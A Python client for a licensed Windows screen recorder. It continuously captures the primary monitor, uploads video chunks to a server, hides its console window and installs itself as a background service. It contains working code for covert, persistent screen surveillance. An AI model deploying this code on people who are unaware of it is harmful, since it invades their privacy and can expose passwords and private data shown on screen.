"""
Screen Recorder Client
Records screen, validates license, and uploads to server
Enhanced with retry logic, offline queue, and heartbeat
"""

import os
import sys
import tempfile
import logging
from pathlib import Path

# Add shared module to path - check same dir first (deployed), then parent (dev)
_script_dir = os.path.dirname(os.path.abspath(__file__))
_shared_same_level = os.path.join(_script_dir, "shared")
_shared_parent_level = os.path.join(_script_dir, "..", "shared")
if os.path.isdir(_shared_same_level):
    sys.path.insert(0, _shared_same_level)
else:
    sys.path.insert(0, _shared_parent_level)

# Configure logging - stdout only, NSSM captures it to service.log
# (same pattern as server/app.py - logging.basicConfig with no file handler)
LOG_DIR = Path(os.environ.get("APPDATA", tempfile.gettempdir())) / "ScreenRecSvc"
LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)
logger.info("screen_recorder.py starting up...")

try:
    import cv2
    import numpy as np
    import mss
    import time
    import json
    import requests
    import threading
    import hashlib
    import queue
    import random
    from datetime import datetime
    from io import BytesIO
    from typing import Optional, Dict, Any, List, Tuple
    from dataclasses import dataclass, field
    from enum import Enum
    import zipfile

    logger.info("All imports successful")
except ImportError as _import_err:
    logger.error(f"Import error - missing dependency: {_import_err}")
    logger.error("Run: pip install -r requirements.txt")
    sys.exit(1)

try:
    from license_manager import LicenseManager, MachineIdentifier

    logger.info("license_manager imported successfully")
except ImportError as _lm_err:
    logger.error(f"Failed to import license_manager: {_lm_err}")
    logger.error(f"Shared path searched: {_shared_same_level}, {_shared_parent_level}")
    sys.exit(1)


class ClientState(Enum):
    """Client state enumeration"""

    INITIALIZING = "initializing"
    LICENSE_INVALID = "license_invalid"
    RECORDING = "recording"
    PAUSED = "paused"
    STOPPED = "stopped"
    ERROR = "error"


@dataclass
class UploadTask:
    """Represents a video upload task"""

    video_path: Path
    timestamp: datetime
    retry_count: int = 0
    max_retries: int = 5
    last_error: Optional[str] = None

    def increment_retry(self) -> bool:
        """Increment retry count and return if retries remaining"""
        self.retry_count += 1
        return self.retry_count < self.max_retries


@dataclass
class Config:
    """Configuration manager for the client"""

    server_url: str = "http://localhost:5000"
    upload_interval: int = 300  # 5 minutes
    recording_fps: int = 10
    video_quality: int = 80
    chunk_duration: int = 60  # 1 minute per video chunk
    license_file: str = "license.key"
    hidden_mode: bool = True
    heartbeat_interval: int = 60  # seconds
    max_offline_storage_mb: int = 1000  # 1GB max offline storage
    retry_base_delay: float = 1.0  # Base delay for exponential backoff
    retry_max_delay: float = 300.0  # Max delay 5 minutes

    def __post_init__(self):
        """Load configuration from file"""
        self._load_from_file()

    def _load_from_file(self) -> None:
        """Load configuration from file"""
        config_file = LOG_DIR / "config.json"
        if config_file.exists():
            try:
                with open(config_file, "r") as f:
                    data = json.load(f)
                    for key, value in data.items():
                        if hasattr(self, key):
                            setattr(self, key, value)
                logger.info("Configuration loaded from file")
            except (json.JSONDecodeError, IOError) as e:
                logger.warning(f"Failed to load config: {e}")

    def save_to_file(self) -> None:
        """Save configuration to file"""
        config_file = LOG_DIR / "config.json"
        try:
            with open(config_file, "w") as f:
                json.dump(self.__dict__, f, indent=2)
        except IOError as e:
            logger.error(f"Failed to save config: {e}")


class RetryHandler:
    """Handles retry logic with exponential backoff"""

    def __init__(
        self, base_delay: float = 1.0, max_delay: float = 300.0, max_retries: int = 5
    ):
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.max_retries = max_retries

    def get_delay(self, retry_count: int) -> float:
        """Calculate delay with exponential backoff and jitter"""
        if retry_count <= 0:
            return 0

        # Exponential backoff
        delay = self.base_delay * (2 ** (retry_count - 1))

        # Add jitter (random factor between 0.5 and 1.5)
        jitter = random.uniform(0.5, 1.5)
        delay *= jitter

        # Cap at max delay
        return min(delay, self.max_delay)

    def should_retry(self, retry_count: int, error: Exception) -> bool:
        """Determine if we should retry based on error type and count"""
        if retry_count >= self.max_retries:
            return False

        # Retry on network errors, timeouts, and 5xx server errors
        retryable_errors = (
            requests.exceptions.ConnectionError,
            requests.exceptions.Timeout,
            requests.exceptions.ChunkedEncodingError,
        )

        if isinstance(error, retryable_errors):
            return True

        # Check for HTTP 5xx errors
        if isinstance(error, requests.exceptions.HTTPError):
            if hasattr(error, "response") and error.response is not None:
                return 500 <= error.response.status_code < 600

        return False


class OfflineQueue:
    """Manages offline video queue for when server is unavailable"""

    def __init__(self, queue_dir: Path, max_storage_mb: int = 1000):
        self.queue_dir = queue_dir
        self.queue_dir.mkdir(parents=True, exist_ok=True)
        self.max_storage_bytes = max_storage_mb * 1024 * 1024
        self.queue: List[UploadTask] = []
        self._load_queue()

    def _load_queue(self) -> None:
        """Load pending uploads from disk"""
        queue_file = self.queue_dir / "upload_queue.json"
        if queue_file.exists():
            try:
                with open(queue_file, "r") as f:
                    data = json.load(f)
                    for item in data:
                        task = UploadTask(
                            video_path=Path(item["video_path"]),
                            timestamp=datetime.fromisoformat(item["timestamp"]),
                            retry_count=item.get("retry_count", 0),
                            last_error=item.get("last_error"),
                        )
                        if task.video_path.exists():
                            self.queue.append(task)
                        else:
                            logger.warning(
                                f"[OfflineQueue] Queued file missing, skipping: {task.video_path}"
                            )
                logger.info(
                    f"[OfflineQueue] Loaded {len(self.queue)} pending uploads from disk"
                )
            except (json.JSONDecodeError, IOError) as e:
                logger.warning(f"[OfflineQueue] Failed to load queue: {e}")
        else:
            logger.info(f"[OfflineQueue] No existing queue file at {queue_file}")

    def _save_queue(self) -> None:
        """Save pending uploads to disk"""
        queue_file = self.queue_dir / "upload_queue.json"
        try:
            data = [
                {
                    "video_path": str(task.video_path),
                    "timestamp": task.timestamp.isoformat(),
                    "retry_count": task.retry_count,
                    "last_error": task.last_error,
                }
                for task in self.queue
            ]
            with open(queue_file, "w") as f:
                json.dump(data, f, indent=2)
        except IOError as e:
            logger.error(f"Failed to save queue: {e}")

    def add(self, video_path: Path) -> bool:
        """Add a video to the offline queue"""
        # Check storage limit
        current_size = self.get_total_size()
        video_size = video_path.stat().st_size if video_path.exists() else 0
        logger.info(
            f"[OfflineQueue] Attempting to add {video_path.name} (size: {video_size} bytes, current queue size: {current_size} bytes)"
        )

        if current_size + video_size > self.max_storage_bytes:
            logger.warning(
                "[OfflineQueue] Offline storage limit reached ({current_size} + {video_size} > {self.max_storage_bytes}), removing oldest videos"
            )
            self._remove_oldest_until_fits(video_size)

        task = UploadTask(video_path=video_path, timestamp=datetime.utcnow())
        self.queue.append(task)
        self._save_queue()
        logger.info(
            f"[OfflineQueue] Added video to offline queue: {video_path.name} (queue now has {len(self.queue)} items)"
        )
        return True

    def remove(self, task: UploadTask) -> None:
        """Remove a task from the queue"""
        if task in self.queue:
            self.queue.remove(task)
            self._save_queue()

    def get_next(self) -> Optional[UploadTask]:
        """Get the next task to process"""
        if self.queue:
            return self.queue[0]
        return None

    def get_total_size(self) -> int:
        """Get total size of queued videos"""
        return sum(
            task.video_path.stat().st_size
            for task in self.queue
            if task.video_path.exists()
        )

    def _remove_oldest_until_fits(self, needed_space: int) -> None:
        """Remove oldest videos until there's enough space"""
        while (
            self.queue and self.get_total_size() + needed_space > self.max_storage_bytes
        ):
            oldest = self.queue.pop(0)
            if oldest.video_path.exists():
                oldest.video_path.unlink()
                logger.info(
                    f"Removed oldest video from queue: {oldest.video_path.name}"
                )
            self._save_queue()

    def is_empty(self) -> bool:
        """Check if queue is empty"""
        return len(self.queue) == 0

    def count(self) -> int:
        """Get number of items in queue"""
        return len(self.queue)


class HeartbeatManager:
    """Manages heartbeat communication with server"""

    def __init__(self, config: Config, license_key: str, machine_id: str):
        self.config = config
        self.license_key = license_key
        self.machine_id = machine_id
        self.last_heartbeat: Optional[datetime] = None
        self.server_reachable = False
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        """Start heartbeat thread"""
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._thread.start()
        logger.info("Heartbeat manager started")

    def stop(self) -> None:
        """Stop heartbeat thread"""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Heartbeat manager stopped")

    def _heartbeat_loop(self) -> None:
        """Heartbeat loop"""
        logger.info("[HEARTBEAT] Heartbeat loop started")
        while not self._stop_event.is_set():
            try:
                self._send_heartbeat()
            except Exception as e:
                logger.error(f"[HEARTBEAT] Error in heartbeat loop: {e}", exc_info=True)

            # Wait for next interval or stop signal
            logger.debug(
                f"[HEARTBEAT] Sleeping for {self.config.heartbeat_interval} seconds"
            )
            self._stop_event.wait(self.config.heartbeat_interval)

    def _send_heartbeat(self) -> None:
        """Send heartbeat to server"""
        url = f"{self.config.server_url}/api/v1/heartbeat"
        logger.debug(f"[HEARTBEAT] Sending heartbeat to {url}")

        headers = {
            "X-License-Key": self.license_key,
            "X-Machine-ID": self.machine_id,
            "Content-Type": "application/json",
        }

        try:
            response = requests.post(
                url,
                headers=headers,
                json={"timestamp": datetime.utcnow().isoformat()},
                timeout=10,
            )

            if response.status_code == 200:
                self.last_heartbeat = datetime.utcnow()
                self.server_reachable = True
                logger.debug("[HEARTBEAT] Heartbeat successful")
            else:
                self.server_reachable = False
                logger.warning(
                    f"[HEARTBEAT] Heartbeat failed: HTTP {response.status_code} - {response.text[:100]}"
                )

        except requests.exceptions.RequestException as e:
            self.server_reachable = False
            logger.warning(f"[HEARTBEAT] Heartbeat failed (server unreachable): {e}")


class ScreenRecorder:
    """Main screen recorder class with enhanced features"""

    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.state = ClientState.INITIALIZING
        self.license_valid = False
        self.license_data: Optional[Dict[str, Any]] = None
        self.recording_thread: Optional[threading.Thread] = None
        self.upload_thread: Optional[threading.Thread] = None
        self.video_chunks: List[Path] = []
        self.current_video: Optional[Path] = None
        self.video_writer: Optional[cv2.VideoWriter] = None
        # MSS is not thread-safe, create instance in recording thread
        self.sct: Optional[mss.mss] = None
        self.license_manager = LicenseManager()
        self.machine_id = MachineIdentifier.get_machine_id()
        self.license_key: Optional[str] = None
        self._stop_event = threading.Event()

        # Initialize retry handler
        self.retry_handler = RetryHandler(
            base_delay=self.config.retry_base_delay,
            max_delay=self.config.retry_max_delay,
        )

        # Initialize offline queue
        self.offline_queue = OfflineQueue(
            queue_dir=LOG_DIR / "offline_queue",
            max_storage_mb=self.config.max_offline_storage_mb,
        )

        # Heartbeat manager (initialized after license validation)
        self.heartbeat_manager: Optional[HeartbeatManager] = None

        # Load public key for license validation
        self._load_public_key()

        # Video storage
        self.video_dir = LOG_DIR / "recordings"
        self.video_dir.mkdir(parents=True, exist_ok=True)

        logger.info(f"ScreenRecorder initialized. Machine ID: {self.machine_id}")

    def _load_public_key(self) -> None:
        """Load public key embedded in the application"""
        # Public key will be embedded during build
        public_key_path = Path(__file__).parent / "public_key.pem"
        if public_key_path.exists():
            with open(public_key_path, "r") as f:
                self.license_manager.load_public_key(f.read())
            logger.info("Public key loaded successfully")
        else:
            logger.warning("Public key file not found")

    def validate_license(self, license_key: Optional[str] = None) -> Tuple[bool, str]:
        """Validate the license"""
        logger.info("[LICENSE] Starting license validation...")
        if license_key is None:
            # Search for license file in multiple locations
            search_paths = [
                LOG_DIR / self.config.license_file,
                Path(_script_dir) / self.config.license_file,
                Path(os.environ.get("PROGRAMFILES", "C:\\Program Files"))
                / "ScreenRecSvc"
                / self.config.license_file,
            ]
            logger.debug(f"[LICENSE] Searching for license in paths: {search_paths}")
            license_path = None
            for p in search_paths:
                if p.exists():
                    license_path = p
                    logger.info(f"[LICENSE] Found license file at: {p}")
                    break
            if license_path:
                with open(license_path, "r") as f:
                    license_key = f.read().strip()
                self.license_key = license_key
                logger.info(f"[LICENSE] License file loaded from: {license_path}")
            else:
                searched = ", ".join(str(p) for p in search_paths)
                logger.error(f"[LICENSE] No license file found. Searched: {searched}")
                self.state = ClientState.LICENSE_INVALID
                return False, "No license file found"

        logger.debug(
            f"[LICENSE] Validating license key: {license_key[:20]}... for machine: {self.machine_id}"
        )
        is_valid, result = self.license_manager.validate_license(
            license_key, self.machine_id
        )

        if is_valid:
            self.license_valid = True
            self.license_data = result
            self.license_key = license_key
            logger.info(
                f"[LICENSE] License validated successfully. Expires: {result['expires_at']}"
            )
            return True, result
        else:
            self.license_valid = False
            self.state = ClientState.LICENSE_INVALID
            logger.error(f"[LICENSE] License validation failed: {result}")
            return False, result

    def get_screen_size(self) -> Tuple[int, int]:
        """Get the primary monitor size"""
        monitor = self.sct.monitors[1]  # Primary monitor
        return monitor["width"], monitor["height"]

    def _get_video_path(self) -> Path:
        """Generate a unique video file path"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        video_path = self.video_dir / f"rec_{timestamp}_{self.machine_id[:8]}.mp4"
        logger.debug(f"[PATH] Generated video path: {video_path}")
        return video_path

    def start_recording(self) -> bool:
        """Start screen recording"""
        logger.info("[START] Attempting to start recording...")
        if not self.license_valid:
            logger.error("[START] Cannot start recording: Invalid license")
            return False

        if self.state == ClientState.RECORDING:
            logger.warning("[START] Recording already in progress")
            return True

        self._stop_event.clear()
        self.state = ClientState.RECORDING
        logger.info("[START] State set to RECORDING")

        # Start recording thread
        logger.info("[START] Starting recording thread...")
        self.recording_thread = threading.Thread(target=self._record_loop, daemon=True)
        self.recording_thread.start()
        logger.info("[START] Recording thread started")

        # Start upload thread
        logger.info("[START] Starting upload thread...")
        self.upload_thread = threading.Thread(target=self._upload_loop, daemon=True)
        self.upload_thread.start()
        logger.info("[START] Upload thread started")

        # Start heartbeat manager
        if self.license_key:
            logger.info("[START] Starting heartbeat manager...")
            self.heartbeat_manager = HeartbeatManager(
                self.config, self.license_key, self.machine_id
            )
            self.heartbeat_manager.start()
            logger.info("[START] Heartbeat manager started")
        else:
            logger.warning(
                "[START] No license key available, skipping heartbeat manager"
            )

        logger.info("[START] Recording started successfully")
        return True

    def stop_recording(self) -> None:
        """Stop screen recording"""
        logger.info("[STOP] Stopping recording...")
        self._stop_event.set()
        self.state = ClientState.STOPPED
        logger.info("[STOP] State set to STOPPED, stop event set")

        if self.video_writer is not None:
            logger.info("[STOP] Releasing video writer")
            self.video_writer.release()
            self.video_writer = None

        if self.heartbeat_manager:
            logger.info("[STOP] Stopping heartbeat manager")
            self.heartbeat_manager.stop()

        logger.info("[STOP] Recording stopped")

    def _record_loop(self) -> None:
        """Main recording loop"""
        # MSS is not thread-safe, create instance in this thread
        sct = mss.mss()

        fps = self.config.recording_fps
        chunk_duration = self.config.chunk_duration

        width, height = self.get_screen_size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")

        chunk_start_time = time.time()
        video_path = self._get_video_path()
        self.video_writer = cv2.VideoWriter(
            str(video_path), fourcc, fps, (width, height)
        )

        logger.info(
            f"[RECORD] Started new video chunk: {video_path.name} (resolution: {width}x{height}, fps: {fps})"
        )

        frames_captured = 0
        while not self._stop_event.is_set():
            try:
                # Capture screen
                screenshot = sct.grab(sct.monitors[1])
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                # Write frame
                if self.video_writer is not None:
                    self.video_writer.write(frame)
                    frames_captured += 1

                # Check if chunk duration exceeded
                if time.time() - chunk_start_time >= chunk_duration:
                    # Save current chunk and start new one
                    if self.video_writer is not None:
                        self.video_writer.release()
                        logger.info(
                            f"[RECORD] Released video writer for chunk: {video_path.name}"
                        )

                    self.video_chunks.append(video_path)
                    logger.info(
                        f"[RECORD] Video chunk completed: {video_path.name} (frames: {frames_captured})"
                    )

                    # Start new chunk
                    chunk_start_time = time.time()
                    video_path = self._get_video_path()
                    self.video_writer = cv2.VideoWriter(
                        str(video_path), fourcc, fps, (width, height)
                    )
                    logger.info(f"[RECORD] Started new video chunk: {video_path.name}")
                    frames_captured = 0

                time.sleep(1.0 / fps)
            except Exception as e:
                logger.error(f"[RECORD] Recording error: {e}", exc_info=True)
                time.sleep(1)

    def _upload_loop(self) -> None:
        """Upload completed video chunks to server"""
        logger.info("[UPLOAD] Upload loop started")
        while not self._stop_event.is_set():
            try:
                # First, process offline queue
                queue_count = self.offline_queue.count()
                if queue_count > 0:
                    logger.info(
                        f"[UPLOAD] Processing {queue_count} items in offline queue"
                    )

                while not self.offline_queue.is_empty():
                    task = self.offline_queue.get_next()
                    if task is None:
                        break

                    logger.info(
                        f"[UPLOAD] Attempting upload of queued video: {task.video_path.name}"
                    )
                    success = self._upload_video_with_retry(task)
                    if success:
                        self.offline_queue.remove(task)
                        if task.video_path.exists():
                            file_size = task.video_path.stat().st_size
                            task.video_path.unlink()
                            logger.info(
                                f"[UPLOAD] Successfully uploaded and deleted queued video: {task.video_path.name} ({file_size} bytes)"
                            )
                        else:
                            logger.warning(
                                f"[UPLOAD] Queued video already deleted: {task.video_path.name}"
                            )
                    else:
                        # Server still unreachable, wait and retry later
                        logger.warning(
                            f"[UPLOAD] Failed to upload queued video (will retry later): {task.video_path.name}"
                        )
                        break

                # Upload current chunks
                chunks_count = len(self.video_chunks)
                if chunks_count > 0:
                    logger.info(
                        f"[UPLOAD] Found {chunks_count} completed chunks ready for upload"
                    )

                for video_path in list(self.video_chunks):
                    if video_path.exists():
                        file_size = video_path.stat().st_size
                        logger.info(
                            f"[UPLOAD] Attempting upload of completed chunk: {video_path.name} ({file_size} bytes)"
                        )
                        task = UploadTask(
                            video_path=video_path, timestamp=datetime.utcnow()
                        )
                        success = self._upload_video_with_retry(task)
                        if success:
                            self.video_chunks.remove(video_path)
                            try:
                                video_path.unlink()
                                logger.info(
                                    f"[UPLOAD] Successfully uploaded and deleted chunk: {video_path.name}"
                                )
                            except OSError as e:
                                logger.error(
                                    f"[UPLOAD] Failed to delete uploaded chunk {video_path.name}: {e}"
                                )
                        else:
                            # Add to offline queue for later
                            logger.warning(
                                f"[UPLOAD] Upload failed, moving to offline queue: {video_path.name}"
                            )
                            self.offline_queue.add(video_path)
                            self.video_chunks.remove(video_path)
                    else:
                        logger.warning(
                            f"[UPLOAD] Chunk file missing, removing from tracking: {video_path.name}"
                        )
                        self.video_chunks.remove(video_path)

                # Wait for next interval
                logger.debug(
                    f"[UPLOAD] Upload loop sleeping for {self.config.upload_interval} seconds"
                )
                self._stop_event.wait(self.config.upload_interval)

            except Exception as e:
                logger.error(f"[UPLOAD] Upload error: {e}", exc_info=True)
                time.sleep(60)

    def _upload_video_with_retry(self, task: UploadTask) -> bool:
        """Upload a video file with retry logic"""
        if not task.video_path.exists():
            logger.warning(f"[UPLOAD] Video file not found: {task.video_path.name}")
            return True  # Remove from queue

        file_size = task.video_path.stat().st_size
        logger.info(
            f"[UPLOAD] Starting upload attempt for: {task.video_path.name} ({file_size} bytes)"
        )
        url = f"{self.config.server_url}/api/v1/upload"

        for attempt in range(task.retry_count, self.retry_handler.max_retries):
            try:
                with open(task.video_path, "rb") as f:
                    files = {"video": (task.video_path.name, f, "video/mp4")}
                    headers = {
                        "X-License-Key": self.license_key or "",
                        "X-Machine-ID": self.machine_id,
                    }
                    data = {
                        "machine_id": self.machine_id,
                        "timestamp": task.timestamp.isoformat(),
                    }

                    logger.debug(
                        f"[UPLOAD] Attempt {attempt + 1}/{self.retry_handler.max_retries} for {task.video_path.name}"
                    )
                    response = requests.post(
                        url, files=files, data=data, headers=headers, timeout=60
                    )

                    if response.status_code == 200:
                        logger.info(
                            f"[UPLOAD] SUCCESS: Video uploaded successfully: {task.video_path.name}"
                        )
                        return True
                    elif 500 <= response.status_code < 600:
                        # Server error, retry
                        logger.warning(
                            f"[UPLOAD] Server error {response.status_code} for {task.video_path.name}, will retry"
                        )
                        raise requests.exceptions.HTTPError(response=response)
                    else:
                        # Client error, don't retry
                        logger.error(
                            f"[UPLOAD] Upload failed (client error) for {task.video_path.name}: HTTP {response.status_code} - {response.text[:200]}"
                        )
                        return False

            except requests.exceptions.RequestException as e:
                task.retry_count = attempt + 1
                task.last_error = str(e)
                logger.warning(
                    f"[UPLOAD] Network error on attempt {attempt + 1} for {task.video_path.name}: {e}"
                )

                if self.retry_handler.should_retry(attempt + 1, e):
                    delay = self.retry_handler.get_delay(attempt + 1)
                    logger.warning(
                        f"[UPLOAD] Upload failed, retrying in {delay:.1f}s: {e}"
                    )
                    time.sleep(delay)
                else:
                    logger.error(
                        f"[UPLOAD] Upload failed after {attempt + 1} attempts for {task.video_path.name}: {e}"
                    )
                    return False

        logger.error(
            f"[UPLOAD] Giving up on {task.video_path.name} after {self.retry_handler.max_retries} attempts"
        )
        return False


class HiddenRunner:
    """Manages hidden execution of the screen recorder"""

    def __init__(self):
        self.recorder: Optional[ScreenRecorder] = None
        self.running = False

    def start(self) -> bool:
        """Start the hidden screen recorder"""
        logger.info("[HIDDEN_RUNNER] Starting hidden screen recorder service")
        try:
            # Hide console window on Windows
            self._hide_console()

            logger.info("[HIDDEN_RUNNER] Creating ScreenRecorder instance")
            self.recorder = ScreenRecorder()

            # Validate license
            logger.info("[HIDDEN_RUNNER] Validating license...")
            valid, result = self.recorder.validate_license()
            if not valid:
                logger.error(f"[HIDDEN_RUNNER] License validation failed: {result}")
                return False
            logger.info("[HIDDEN_RUNNER] License validation successful")

            # Start recording
            logger.info("[HIDDEN_RUNNER] Starting recording...")
            if self.recorder.start_recording():
                self.running = True
                logger.info(
                    "[HIDDEN_RUNNER] Screen recorder service started successfully"
                )
                return True
            else:
                logger.error("[HIDDEN_RUNNER] Failed to start recording")
                return False

        except Exception as e:
            logger.error(
                f"[HIDDEN_RUNNER] Failed to start hidden runner: {e}", exc_info=True
            )
            return False

    def stop(self) -> None:
        """Stop the screen recorder"""
        if self.recorder:
            self.recorder.stop_recording()
        self.running = False
        logger.info("Screen recorder service stopped")

    def _hide_console(self) -> None:
        """Hide the console window on Windows"""
        try:
            import ctypes

            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except (ImportError, AttributeError, OSError):
            pass

    def run_forever(self) -> None:
        """Run the service until stopped"""
        if self.start():
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            finally:
                self.stop()


def install_as_service() -> None:
    """Install the recorder as a Windows service"""
    try:
        import win32service
        import win32serviceutil
        import win32event
        import servicemanager

        class ScreenRecorderService(win32serviceutil.ServiceFramework):
            _svc_name_ = "ScreenRecSvc"
            _svc_display_name_ = "Screen Recording Service"
            _svc_description_ = "Automatic screen recording service"

            def __init__(self, args):
                win32serviceutil.ServiceFramework.__init__(self, args)
                self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
                self.runner = None

            def SvcStop(self):
                self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
                if self.runner:
                    self.runner.stop()
                win32event.SetEvent(self.hWaitStop)

            def SvcDoRun(self):
                self.runner = HiddenRunner()
                self.runner.start()
                win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE)

        win32serviceutil.HandleCommandLine(ScreenRecorderService)

    except ImportError:
        logger.warning("pywin32 not available, running as regular process")
        runner = HiddenRunner()
        runner.run_forever()


if __name__ == "__main__":
    # Check if installing as service or running directly
    if len(sys.argv) > 1 and sys.argv[1] in ("install", "--install"):
        # Normalize to pywin32's expected 'install' argument
        sys.argv[1] = "install"
        install_as_service()
    elif len(sys.argv) > 1 and sys.argv[1] in ("remove", "--uninstall"):
        sys.argv[1] = "remove"
        install_as_service()
    else:
        # Run as hidden process
        runner = HiddenRunner()
        runner.run_forever()
